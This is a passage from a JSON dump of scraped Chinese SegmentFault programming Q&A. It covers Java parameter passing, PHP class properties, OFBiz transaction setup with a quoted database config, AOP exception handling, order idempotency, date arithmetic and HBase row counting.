      "answer2": "<div class=\"answer fmt\" data-id=\"1020000004622222\">\n<p>其实都是值传递, 所谓\"引用传递\"是说传递的值是一个引用.</p>\n<p>引用传递的存在是因为OOP.<br>一个实例是数据和方法的组合, 往往映射到一个实体.<br>那么\"按值传递\"一个对象, 或者说\"把数据memcpy一份来创建一个新对象\"这个行为的语义可能是可疑的. 把一个Person实例这样复制一份对应现实中的什么呢? 新的Person涨工资了旧的Person应该怎样?</br></br></p>\n<p>\"复制出一个相等且独立的对象\"这个需求当然也是存在的, 比如复制一个三角形. 不过这种事用拷贝构造函数就可以实现, 不必专门提供一个机制.</p>\n<p>所以如果只实现一种\"传递对象\"的语义 (不像C++那么复杂), 传递对象的引用是比较不古怪的思路.</p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000004613717\">\n<p>值传递应该是拷贝了一个副本，引用传递是将变量直接指向内存中的地址，这个地址中的值变了的话，所有指向它的变量值都变了。比如变量a的值是123456，在内存中的地址是0xxxx,将a引用传值给b，那么b也指向0xxxx，即使修改b的值，也就是修改了该地址中的值，a的值也会改变。但是直接赋值的话他们在内存中的地址就不同了，互不相干。</p>\n</div>",
      "attention": "6",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000004613588\">\n<p>为什么在java学习中要引入这个值传递和引用传递？也就是说这个值传递和引用传递的作用是什么？</p>\n</div>",
      "favourite": "1",
      "glance": "253",
      "tags": [
        "java-se",
        "java"
      ],
      "time": "3-15",
      "title": "值传递和引用传递",
      "url": "https://segmentfault.com/q/1010000004613588"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000005733313\">\n<p>PHP暂时未提供对对象属性直接赋值对象的支持，对象的赋值暂时只能通过构造函数来实现。<br>当然，你不能说php要向java去学习面向对象，也没有谁规定java才是面向对象的标杆，如果php真的样样都和java一样了，那它干嘛还叫php呢。</br></p>\n<p>补答：PHP7依然是这样。</p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000005736461\">\n<p>class的直接赋值只能是 标量 (数值,字符串,数组,布尔)</p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000005770176\">\n<p>因为如果允许<br><code>private $db = new Db();</code><br>这样的语法，那么，文件被加载后，Db类就被初始化了。<br>请注意，是A类被载入内存，Db类就被实例化了。<br>而如果Db类也用了同样的语法，那么可能你include一个文件，就会很慢，因为include的同时，就在进行一系列的类实例化行为。</br></br></br></br></p>\n<p>而禁用这种特性，只允许在类构造方法中实例化其他类，就能很好的控制类实例化的流程了。加载类时，永远不会产生附带的类实例化。</p>\n<p>无论对于系统的优化，还是对于程序运行时间的掌控，可预测、可控的，才是好的、可持续的。</p>\n</div>",
      "attention": "10",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000005733084\">\n<pre><code>private $db = new Db();</code></pre>\n<p>如上，在php5的类中，如果直接声明一个实例变量，就会报类声明错误</p>\n<p>改成下面这样就可以</p>\n<pre><code>private $db = null;\n    \npublic function __construct(){\n    $this-&gt;db = new Db();    \n}</code></pre>\n<p>非得先声明一个空值，再用方法赋值，搞的常常写出来查半天发现没bug，才明白原来是语法要求。</p>\n<p>不明白是基于什么考虑，我理解，可能是php5学习面象对象学的还不完善，所以有很多问题，大伙聊聊。</p>\n<p>补问:PHP7还是这样吗?</p>\n<p>鸟哥，求撸 @Laruence<br>.</br></p>\n</div>",
      "favourite": "3",
      "glance": "407",
      "tags": [
        "php",
        "java",
        "oop"
      ],
      "time": "6-16",
      "title": "PHP5的类实例变量的声明问题",
      "url": "https://segmentfault.com/q/1010000005733084"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "3",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000005831187\">\n<p>1.仅使用ofbiz的实体引擎，程序如下：</p>\n<pre><code>  boolean beganTrans = true;   \n    Map&lt;String, Object&gt; resignMap = new HashMap&lt;String, Object&gt;();\n    resignMap.put(\"userLoginId\", \"wwww\");\n    resignMap.put(\"password\", \"1321313133\");\n    resignMap.put(\"signDaySeries\",\"0\");\n    resignMap.put(\"isValidate\", \"1\");\n    Date date=new Date();\n    DateFormat format=new SimpleDateFormat(\"yyyy-MM-dd HH:mm:ss\");\n    String buildDate=format.format(date);\n    resignMap.put(\"regeTime\", buildDate);\n    GenericDelegator delegator = GenericDelegator.getGenericDelegator(\"default\");   \n\n    try {      \n\n        if (beganTrans)   \n            \n\n             beganTrans = TransactionUtil.begin();  \n         \n        GenericValue value=delegator.create(\"LotteryUser\", resignMap);\n     \n        GenericValue value1=delegator.create(\"LotteryUser\", resignMap);\n        \n        TransactionUtil.commit(beganTrans); \n\n                \n</code></pre>\n<pre><code>    } catch (Exception e) {      \n\n               e.printStackTrace();      \n\n                  \n\n               try {       \n\n                        TransactionUtil.rollback(beganTrans);   \n\n            } catch (GenericTransactionException e1) {       \n\n                        e1.printStackTrace();   \n\n            }   \n        resp.getWriter().write(\"sorry\");\n    \n\n</code></pre>\n<pre><code>}\n</code></pre>\n<p><strong>实体引擎配置如下：</strong></p>\n<pre><code> &lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;\n    &lt;entity-config xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:noNamespaceSchemaLocation=\"http://www.ofbiz.org/dtds/entity-config.xsd\"&gt;\n      &lt;resource-loader class=\"org.ofbiz.base.config.FileLoader\"\n        name=\"fieldfile\" prefix=\"/framework/entity/fieldtype/\" prepend-env=\"ofbiz.home\"/&gt;\n      &lt;transaction-factory class=\"org.ofbiz.geronimo.GeronimoTransactionFactory\"/&gt;\n       &lt;connection-factory class=\"org.ofbiz.entity.connection.DBCPConnectionFactory\"/&gt;\n    \n        &lt;debug-xa-resources value=\"false\" /&gt; \n      &lt;delegator distributed-cache-clear-enabled=\"false\"\n        entity-eca-reader=\"main\" entity-group-reader=\"main\"\n        entity-model-reader=\"main\" name=\"default\"&gt;\n        &lt;group-map datasource-name=\"localmysql\" group-name=\"org.ofbiz\"/&gt;\n        &lt;group-map datasource-name=\"localmysql\" group-name=\"com.xbstar\"/&gt;\n      &lt;/delegator&gt;\n      &lt;!-- need to at least define a name for each component to use --&gt;\n      &lt;entity-model-reader name=\"main\"/&gt;\n      &lt;!-- need to at least define a name for each component to use --&gt;\n      &lt;entity-group-reader name=\"main\"/&gt;\n      &lt;!-- need to at least define a name for each component to use --&gt;\n      &lt;entity-eca-reader name=\"main\"/&gt;\n      &lt;!-- need to at least define a name for each component to use rmp_agri --&gt;\n      &lt;entity-data-reader name=\"seed\"/&gt;\n      &lt;entity-data-reader name=\"demo\"/&gt;\n      &lt;entity-data-reader name=\"ext\"/&gt;\n      &lt;field-type loader=\"fieldfile\" location=\"fieldtypemysql.xml\" name=\"mysql\"/&gt;\n      &lt;field-type loader=\"fieldfile\" location=\"fieldtypeoracle.xml\" name=\"oracle\"/&gt;\n      &lt;field-type loader=\"fieldfile\" location=\"fieldtypemssql.xml\" name=\"mssql\"/&gt;\n      &lt;datasource add-missing-on-start=\"true\" check-on-start=\"true\"\n        field-type-name=\"oracle\"\n        helper-class=\"org.ofbiz.entity.datasource.GenericHelperDAO\"\n        join-style=\"ansi\" name=\"localoracle\" schema-name=\"BPF_NUR\"&gt;\n        &lt;read-data reader-name=\"seed\"/&gt;\n        &lt;read-data reader-name=\"demo\"/&gt; \n        &lt;read-data reader-name=\"ext\"/&gt;\n        &lt;inline-jdbc jdbc-driver=\"oracle.jdbc.driver.OracleDriver\"\n          jdbc-password=\"wxzkxbx\"\n          jdbc-uri=\"jdbc:oracle:thin:@192.168.1.154:1521:ORCL\"\n          jdbc-username=\"bpf_nur\" pool-maxsize=\"100\" pool-minsize=\"20\"/&gt;\n      &lt;/datasource&gt;\n    \n      &lt;datasource add-missing-on-start=\"true\" check-on-start=\"true\"\n        field-type-name=\"mssql\"\n        helper-class=\"org.ofbiz.entity.datasource.GenericHelperDAO\"\n        join-style=\"ansi\" name=\"localmssql\" schema-name=\"dbo\" use-fk-initially-deferred=\"false\"&gt;\n        &lt;read-data reader-name=\"seed\"/&gt;\n        &lt;read-data reader-name=\"demo\"/&gt;\n        &lt;read-data reader-name=\"ext\"/&gt;\n        &lt;inline-jdbc isolation-level=\"ReadCommitted\"\n          jdbc-driver=\"com.microsoft.jdbc.sqlserver.SQLServerDriver\"\n          jdbc-password=\"123456\"\n          jdbc-uri=\"jdbc:microsoft:sqlserver://127.0.0.1:1433;DatabaseName=rmp;SelectMethod=Cursor\"\n          jdbc-username=\"sa\" pool-maxsize=\"100\" pool-minsize=\"20\"/&gt;\n      &lt;/datasource&gt;\n      &lt;datasource add-missing-on-start=\"true\" check-on-start=\"true\"\n        field-type-name=\"mssql\"\n        helper-class=\"org.ofbiz.entity.datasource.GenericHelperDAO\"\n        join-style=\"ansi\" name=\"localmssql2k5\" schema-name=\"dbo\" use-fk-initially-deferred=\"false\"&gt;\n        &lt;read-data reader-name=\"seed\"/&gt;\n        &lt;read-data reader-name=\"demo\"/&gt;\n        &lt;read-data reader-name=\"ext\"/&gt;\n        &lt;inline-jdbc isolation-level=\"ReadCommitted\"\n          jdbc-driver=\"net.sourceforge.jtds.jdbc.Driver\" jdbc-password=\"123\"\n          jdbc-uri=\"jdbc:jtds:sqlserver://127.0.0.1:1433/rmp_ht;charset=GBK\"\n          jdbc-username=\"sa\" pool-maxsize=\"100\" pool-minsize=\"20\"/&gt;\n      &lt;/datasource&gt;\n      &lt;datasource add-missing-on-start=\"true\" check-on-start=\"true\"\n        field-type-name=\"mysql\"\n        helper-class=\"org.ofbiz.entity.datasource.GenericHelperDAO\"\n        join-style=\"ansi-no-parenthesis\" name=\"localmysql\"\n        table-type=\"InnoDB\" use-foreign-keys=\"true\"&gt;\n        &lt;read-data reader-name=\"seed\"/&gt;\n        &lt;read-data reader-name=\"demo\"/&gt;\n        &lt;read-data reader-name=\"ext\"/&gt;\n        &lt;inline-jdbc isolation-level=\"Serializable\"\n          jdbc-driver=\"com.mysql.jdbc.Driver\" jdbc-password=\"wxzkxbx\"\n          jdbc-uri=\"jdbc:mysql://192.168.1.154:3098/lotser?autoReconnect=true\"\n          jdbc-username=\"root\" pool-maxsize=\"100\" pool-minsize=\"30\"/&gt;\n        &lt;!-- &lt;jndi-jdbc jndi-server-name=\"localjndi\" jndi-name=\"java:/MySqlDataSource\" isolation-level=\"Serializable\"/&gt; --&gt;\n    \n      &lt;/datasource&gt;\n    &lt;/entity-config&gt;\n\n\n\n</code></pre>\n<pre><code>**出现的错误如下**</code></pre>\n<p>2016-06-29 16:23:14,439 675716 (http-0.0.0.0-8086-Processor3) [    TransactionUtil.java:349:WARN ] <br>---- exception report ----------------------------------------------------------<br>[TransactionUtil.setRollbackOnly] Calling transaction setRollbackOnly; this stack trace shows where this is happening:<br>Exception: java.lang.Exception<br>Message: null<br>---- stack trace ---------------------------------------------------------------<br>java.lang.Exception<br>org.ofbiz.entity.transaction.TransactionUtil.setRollbackOnly(TransactionUtil.java:349)<br>org.ofbiz.entity.transaction.TransactionUtil.rollback(TransactionUtil.java:286)<br>org.ofbiz.entity.GenericDelegator.create(GenericDelegator.java:723)<br>org.ofbiz.entity.GenericDelegator.create(GenericDelegator.java:656)<br>com.xbstar.wei.servlet.UserLogin.doGet(UserLogin.java:130)<br>javax.servlet.http.HttpServlet.service(HttpServlet.java:617)<br>javax.servlet.http.HttpServlet.service(HttpServlet.java:717)<br>org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:269)<br>org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:188)<br>org.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:213)<br>org.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:172)<br>org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:127)<br>org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:117)<br>org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:108)<br>org.apache.catalina.valves.AccessLogValve.invoke(AccessLogValve.java:548)<br>org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:174)<br>org.apache.coyote.http11.Http11Processor.process(Http11Processor.java:875)<br>org.apache.coyote.http11.Http11BaseProtocol$Http11ConnectionHandler.processConnection(Http11BaseProtocol.java:665)<br>org.apache.tomcat.util.net.PoolTcpEndpoint.processSocket(PoolTcpEndpoint.java:528)<br>org.apache.tomcat.util.net.LeaderFollowerWorkerThread.runIt(LeaderFollowerWorkerThread.java:81)<br>org.apache.tomcat.util.threads.ThreadPool$ControlRunnable.run(ThreadPool.java:689)</br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></p>\n<h2>java.lang.Thread.run(Unknown Source)</h2>\n<pre><code>           *请问大神如何解决？* \n</code></pre>\n</div>",
      "favourite": "0",
      "glance": "137",
      "tags": [
        "java",
        "transaction"
      ],
      "time": "6-29",
      "title": "ofbiz的事务如何配置才能起作用？",
      "url": "https://segmentfault.com/q/1010000005831187"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000005857354\">\n<p>使用Spring AOP对异常进行统一处理，当然是第三种方法更好了。使用Spring AOP对serivce层抛出的异常进行拦截，记录所有未处理的异常日志，并将所有未处理异常转换成统一自定义的系统异常，以便让controller层或Rpc层能够将这些自定义的异常信息反馈到前端，在浏览器端进行展示。<br>不要忘了，使用Spring AOP对异常进行拦截，其真正作用是实现：将异常的处理逻辑和正常的处理逻辑进行解耦。所以你说异常的粒度控制在什么级别？这个是根据你的业务逻辑来的。诸如，操作数据库增删改查失败？调用外部接口失败？其他异常信息等等。 <br>你们公司的方式是不规范的，不合适的。处理日志时，需要在每一个try-catch块包含一些处理代码，有时候异常处理的代码比正常执行代码还多，污染正常执行代码。 异常处理代码散落，修改起来时非常麻烦。无法对某些异常进行统一处理和修改。<br>Service中的业务方法命名不按照事前定义好的规则进行命名的话，AOP是拦截不到的。也就是说事务控制是无法加载的。这些命名的规范什么的需要在配置文件中指定。</br></br></br></p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000005889974\">\n<p>我们都是在controller层做aop异常处理的<br>异常分为非ajax异常和ajax异常, 因为我们是使用jquery,没有做到前后端完全分离,有的前端数据是后端直接渲染</br></p>\n<ol>\n<li><p>ajax异常: 在header中包含X-Requested-With来判断</p></li>\n<li><p>非ajax异常: ajax异常之外的<br>肯定你前台显示给客户错误的方式是不同的, 所以在Interceptor(filter)(aop)中分别处理</br></p></li>\n</ol>\n<p>在service类的每个方法中, 没有说整个用try catch包住的, 太二了,异常分为你控制不了的比如数据库异常,空指针什么的, 这些都不用catch的, 在service中是根据业务中的异常业务抛出, 比如用户名重复了, 我就throw 一个BizException(\"用户名重复\"),其中BizException是继承了RuntimeException的</p>\n<p>lz说的aop来处理异常, 我不知道你是在service层还是controller层, 显然按照我上面的分析应该是在controller层做的</p>\n<p>如果我这个不是最佳答案,就太没天理了</p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000005855829\">\n<p>谢邀！ 不过我得声明我不是专家|_|</p>\n<p><strong>问题：上面1,2,3我对dao层，service层的方法处理是否合理。2,3哪种更好些？</strong></p>\n<p>首先我赞同你在1, 2, 3步里的分析和理解。其次，我认为<code>3</code>的处理更为妥帖，因为<code>service</code>层就已经不是纯粹的数据交互，而是包含了一系列业务逻辑的操作，通过捕获<code>Throwable</code>然后再抛出更有意义的(能准确描述错误的)异常，无论是记入日志还是事物处理，这个对于后续可能存在的补救/错误排查更合适</p>\n<p><strong>4.接上面，这个自定义的业务异常的粒度要控制到什么级别？能否举个例子</strong></p>\n<p>粒度取决于需求，譬如你只想做回滚，那么只要能够定位到什么<code>service</code>错了对你来说就够了。但如果还希望进一步排查<code>root cause</code>，那是不是异常信息里再多一些关于源错误的描述更好些？</p>\n<p><strong>5.上面2，3 我都是用的aop统一处理异常。我看大部分人也推荐这么做。因为service层各个方法里catch里的逻辑大都相似。使用aop统一处理，好处是显而易见的。我想知道，有什么弊端吗？因为我发现公司项目几乎没有这么做的。都是直接try-catch，返回结果。要么就是上面2里提到的不捕获。出了异常反正可以记录在log里</strong></p>\n<p>首先谈你们公司为什么没那么做，这可能是历史原因，之前搭建框架的人对<code>aop</code>认识不足，或者把个人喜好带到了工作中导致选择了直接到处<code>try catch</code>(这种方式简单粗暴，最易掌握)，<code>aop</code>是算是一种设计范式，无论架构师还是程序员，要想熟练掌握并且运用自如还是需要学习成本的(这可能算是弊端吧)。如果你对原因感兴趣，最好找几个老资格同事私底下聊聊看，说不定好能套出些其他内幕^^</p>\n<p>关于\"出了异常反正可以记录在log里\"，想法没有错，但真的在海量日志里处理过错误信息的人是会有体会的。明明可以统一处理，却没做，这算是设计缺陷或者失误。不是解决问题最有效的方案</p>\n<p>我是外行，轻点拍砖^^</p>\n</div>",
      "attention": "8",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000005854418\">\n<p>1.dao层我是直接抛出异常，都是比较“底层”的异常，比如DataAccessException. 不捕获的原因是，假如service调用了多个dao方法，其中有一个发生了异常，如果该dao方法自己捕获了又没有重新抛出来。这时候，service事务没法回滚，因为它以为都执行正确了。<br>2.在service里， 调用的dao方法有可能抛出DataAccessException的话，那么service也不捕获。因为DataAccessException是runtime异常，无需强制try-catch,况且，如果你捕获了又没有抛出来，配置的事务没法感知到，因为默认只处理runtime异常，当然可以配置。<br>3.还可以这样，在service方法里，dao方法外面直接try-catch(Throwable e). 然后重新抛出自定义的业务相关的异常。比如TopicUpdateException. </br></br></p>\n<p>问题：上面1,2,3我对dao层，service层的方法处理是否合理。2,3哪种更好些？为什么？</p>\n<p>4.接上面，这个自定义的业务异常的粒度要控制到什么级别？能否举个例子<br>5.上面2，3 我都是用的aop统一处理异常。我看大部分人也推荐这么做。因为service层各个方法里catch里的逻辑大都相似。使用aop统一处理，好处是显而易见的。我想知道，有什么弊端吗？因为我发现公司项目几乎没有这么做的。都是直接try-catch，返回结果。要么就是上面2里提到的不捕获。出了异常反正可以记录在log里</br></p>\n<p>请大家帮忙看看</p>\n</div>",
      "favourite": "6",
      "glance": "388",
      "tags": [
        "java"
      ],
      "time": "7-2",
      "title": " javaWeb项目使用aop处理异常？ ",
      "url": "https://segmentfault.com/q/1010000005854418"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000005861610\">\n<p>幂等性是系统的接口对外一种承诺(而不是实现), 承诺只要调用接口成功, 外部多次调用对系统的影响是一致的. 声明为幂等的接口会认为外部调用失败是常态, 并且失败之后必然会有重试.</p>\n<p>至于你说的防止订单碎片，我所知道的就是依靠事务了，像支付宝那种高并发环境我也不清楚他们是用的什么。</p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000005861752\">\n<p>用token啊，不仅仅能防止csrf，也能防UI层面的重放。</p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000005861706\">\n<p>谢邀～其实你的理解的有错的～不知道你这些资料是在哪里看到的…<br>实际上…解决并发问题…不单单是简单的数据库锁能解决的…是需要通过一系列缓存、分流、过滤等共同实现的～<br>而等幂性只是一个约定～约定用户在同一操作中～生效的只有一个～例如用户狂点下单～实际中生效的只有一个…解决方法很简单～分2层…前端控制点一次就不能再点…后端做请求唯一标识～然后在缓存中保存～之后真正生效的只有一个～</br></br></p>\n<p>感觉你这几次问的问题更像是教科书中讲的东西～实际应用中远远不是那样的～建议可以关注下科技累的一些文章～例如 淘宝写的秒杀原理～阿里云最近发表的 高并发下红包系统的架构等实际生产中总结的干货～</p>\n</div>",
      "attention": "21",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000005861560\">\n<p>经常听人说在交易系统中，生成订单的时候要控制好两个：一个是幂等性的控制，一个是并发性的控制。<br>我的理解是这样的，并发性的控制，可以从数据库层面上，利用锁表中行的操作，分布式锁的方式来实现并发性，那么幂等性呢？查了一些资料对于幂等性这个概念的理解，还是越看越模糊，有没有什么通俗的对于幂等性的解释呢？此外怎么在生成订单的系统中做好幂等性的控制呢？<br>所以我的问题是：<br>1、怎么通俗的理解幂等性 ？<br>2、如何在项目中做到幂等性的控制，防止订单碎片的产生？？</br></br></br></br></p>\n<p>谢谢~~</p>\n</div>",
      "favourite": "9",
      "glance": "1.9k",
      "tags": [
        "java",
        "spring",
        "mysql",
        "mybatis",
        "hibernate"
      ],
      "time": "7-3",
      "title": "怎么理解在生成订单的时候幂等性的控制",
      "url": "https://segmentfault.com/q/1010000005861560"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000005867010\">\n<p>基本思路：<code>2016-07-04</code>是一个字符串，应该把它转换为秒为单位的整数，然后减去 <code>7 * 24 * 60 * 60s</code>，在转换回日期的字符串。</p>\n<p>java的写法：</p>\n<pre><code>String s = \"2016-07-04\";\nSimpleDateFormat formatter = new SimpleDateFormat (\"yyyy-MM-dd\");\nDate d;\ntry {\n    d = formatter.parse(s);\n    long t = d.getTime() - 7 * 24 * 60 * 60 * 1000;\n    d.setTime(t);\n    System.out.println(formatter.format(d));\n} catch (Exception e) {\n    e.printStackTrace();\n} finally {\n    // ...\n}\n    </code></pre>\n<p>得到的结果：</p>\n<pre><code>2016-06-27\n</code></pre>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000005867138\">\n<p><img data-src=\"/img/bVyMtT\"><br>代码如下：</br></img></p>\n<pre><code>package tt;\n\nimport java.text.SimpleDateFormat;\nimport java.util.Calendar;\nimport java.util.Date;\n\nimport org.apache.commons.lang3.StringUtils;\n\npublic class TestDate {\n\n    /* 三种时间格式 */\n    public static final String DATE_FORMAT     = \"yyyy-MM-dd\";\n    public static final String DATETIME_FORMAT = \"yyyy-MM-dd HH:mm:ss\";\n    public static final String DATETIME        = \"yyyyMMddHHmmss\";\n\n    public static void main(String[] args) {\n        SimpleDateFormat sdf = new SimpleDateFormat(DATE_FORMAT);\n        Date date = sdf.parse(\"2016-07-04\");\n        Date date2 = removeDays(date1, 7);\n        System.out.println(toString(date2, DATETIME_FORMAT));\n    }\n\n    /* 日期减天数 */\n    public static Date removeDays(Date oldDate, int n) {\n        Date newDate = null;\n        Calendar calOld = Calendar.getInstance();\n        calOld.setTime(oldDate);\n        int day = calOld.get(Calendar.DAY_OF_YEAR);\n        Calendar calNew = Calendar.getInstance();\n        calNew.setTime(oldDate);\n        calNew.set(Calendar.DAY_OF_YEAR, day - n);\n        newDate = calNew.getTime();\n        return newDate;\n    }\n\n    /* Date转string类型 */\n    public static String toString(Date date, String formatStr) {\n        if (null == date || StringUtils.isBlank(formatStr)) return \"\";\n        SimpleDateFormat sdf = new SimpleDateFormat(formatStr);\n        return sdf.format(date);\n    }\n\n}\n</code></pre>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000005867371\">\n<p>你非要在jsp页面里面写吗？最好的是在后台Java里面处理好返回到页面。<br>jsp处理方法：在jsp页面导入java.util包，&lt;%@ page import=\"java.util.*\"%&gt;</br></p>\n<pre><code>    Calendar c = Calendar.getInstance();\n    c.setTime(new Date());// 原来的时间\n    c.add(Calendar.DAY_OF_MONTH, -7);// 减7天\n    SimpleDateFormat sdf = new SimpleDateFormat(\"yyyy-MM-dd\");\n    String date = sdf.format(c.getTime());减7天后的时间</code></pre>\n</div>",
      "attention": "5",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000005866755\">\n<p>日期怎么和数做减法啊  </p>\n<p>2016-07-04减去7天    <br>这样的一个表达式要怎么写   要求减完之后 是string类型接收</br></p>\n<pre><code> 给指点一下</code></pre>\n</div>",
      "favourite": "0",
      "glance": "121",
      "tags": [
        "java",
        "jsp"
      ],
      "time": "7-4",
      "title": "时间 减 天数 怎么写在jsp里面  2016-07-04 减去7天 ",
      "url": "https://segmentfault.com/q/1010000005866755"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "4",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000005868802\">\n<p>我想知道 站长之家对网站 ip PV 的一个统计  使用什么样的算法呢。</p>\n<p>大概思路 和方向是什么，我觉得  不通过使用sdk的方式统计的数据  相对准确性 不是很高呢，是我理解的额这样么，求大神告知。</p>\n</div>",
      "favourite": "2",
      "glance": "421",
      "tags": [
        "php",
        "java",
        "golang",
        "c#"
      ],
      "time": "7-4",
      "title": "SEO 统计算法",
      "url": "https://segmentfault.com/q/1010000005868802"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "0",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000141507\">\n<p>Mountain lion 不是从lion升级上来的，是全新安装。安装完后，就未能在实用工具中发现 “Java 偏好设置”应用</p><p>查阅了一些文档，其中有建议安装<a href=\"http://support.apple.com/kb/DL1572\" rel=\"nofollow\" target=\"_blank\" title=\"http://support.apple.com/kb/DL1572\">http://support.apple.com/kb/DL1572</a> 。但我发现这只是对jdk1.6做一个升级支持。“Java偏好设置” 应用未能出现</p><p>当然，我也不是非要这个“Java偏好设置” 应用。只是为了系统级切换jdk时方便些。<br/>\n另外，一些用户是从lion升级到Mountain lion的，没这问题。</p><p>求教，谢谢！</p><p>java已经安装，在终端可以看到是</p><blockquote>java version \"1.6.0_37\"<br/>Java(TM) SE Runtime Environment (build 1.6.0_37-b06-434-11M3909)<br/>Java HotSpot(TM) 64-Bit Server VM (build 20.12-b01-434, mixed mode)</blockquote>\n</div>",
      "favourite": "0",
      "glance": "5k",
      "tags": [
        "macos",
        "java"
      ],
      "time": "2012-11-16",
      "title": "Mountain lion下Java Preference(Java偏好设置)应用丢失",
      "url": "https://segmentfault.com/q/1010000000141507"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000000161796\">\n<p>数据库不是以开始就设计好的。也不可能以开始就设计好。</p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000000161837\">\n<p>这种方法最好的情况是采用分层来设计，这样，如果有新功能，只需要根据功能来调用不同层的接口就可以了。</p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000000163533\">\n<p>1.做之前数据库当然是设计好的，但在做的过程中肯定是会改动的，可能是需求变化，可能是解决方案的变化。<br/>\n2.这样，你说的数据迁移问题，是发生在项目已经上线了，数据都是又有的话，如果数据库改动非常大，那就通过sql导数据吧，hibernate没那么高级。如果数据库改动不大（这要看数据库设计人员的功力了），那也没什么数据迁移的问题了。代码的地方改改好了。<br/>\n3.渐进式开发？好的系统维护性很好，可扩展性强，这要在开发的时候在细节的地方就注意起来。“把变化的和不变的隔离开来”，“面向接口编程”，能用一些设计模式想必是极好的，但不要为了设计而设计哦。但实际情况时，一般（注意是一般）的大型项目，维护或者加新的功能，都会让你头疼的。</p>\n</div>",
      "attention": "0",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000160767\">\n<p>作为一个新手，在大学里面自学过Java编程，也做过几个用SSH的网站。但是没有机会做比较大型的项目。<br/>\n在学校里做这些项目的时候，基本上都是先设计完所有功能，再进行编码，没有遇到需求改动，也没有项目上线之后去加入新的功能。<br/>\n我的疑问是，如果一个项目需要后期不断加入新的功能，那么它的数据库是否需要在一开始就设计好呢？如果不是，那么如何做到在数据库设计改动之后，保证原数据不丢失的情况下进行数据迁移呢？（尤其想问hibernate是怎么做的）。</p>\n</div>",
      "favourite": "3",
      "glance": "2.4k",
      "tags": [
        "java",
        "hibernate",
        "java-ee"
      ],
      "time": "2013-01-14",
      "title": "新手问题：如何做渐进式开发",
      "url": "https://segmentfault.com/q/1010000000160767"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000000451128\">\n<p>hbase支持count，不过结果就是full table scan,性能表现你懂的=.=<br>\n一般的做法是自己维护一个计数器，或者用coprocessor</br></p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000000172216\">\n<p>hbase本身最好不要用来做计算，它真不擅长干这个，把它作为存储系统加好了。<br/>\nhbase shell 中有 count 命令。</p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000000164271\">\n<p><strong>可以借助第三方比如mysql或者memcache等进行贮存和更新对应table的count</strong></p>\n</div>",
      "attention": "0",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000164234\">\n<p>hbase中怎么能快速获得一个table的总行数，类似sql中的count方式</p>\n</div>",
      "favourite": "1",
      "glance": "6.3k",
      "tags": [
        "hbase",
        "java",
        "nosql"
      ],
      "time": "2013-01-23",
      "title": "hbase获取一个table中row的总数",
      "url": "https://segmentfault.com/q/1010000000164234"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "0",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000178306\">\n<p>代码放GAE上，默认时间为美国时区，google到蛮多说下面方法可以解决</p><pre>Calendar cal = Calendar.getInstance(TimeZone.getTimeZone(\"GMT+8\"));\nDate date = cal.getTime();</pre><p>date还是为美国时间，不起作用？</p><p>后来</p><pre>TimeZone.setDefault(TimeZone.getTimeZone(\"GMT+8\"));\nCalendar cal = Calendar.getInstance();\nDate date = cal.getTime();</pre><p>这样就OK了。。。汗</p>\n</div>",
      "favourite": "1",
      "glance": "10.9k",
      "tags": [
        "calendar",
        "java"
      ],
      "time": "2013-03-13",
      "title": "Calendar设置时区的问题",
      "url": "https://segmentfault.com/q/1010000000178306"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "1",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000180427\">\n<p>java 新手<br/>\n不知道怎么将查询结果转为json对象<br/>\n使用的是json-simple 库</p>\n</div>",
      "favourite": "0",
      "glance": "5.3k",
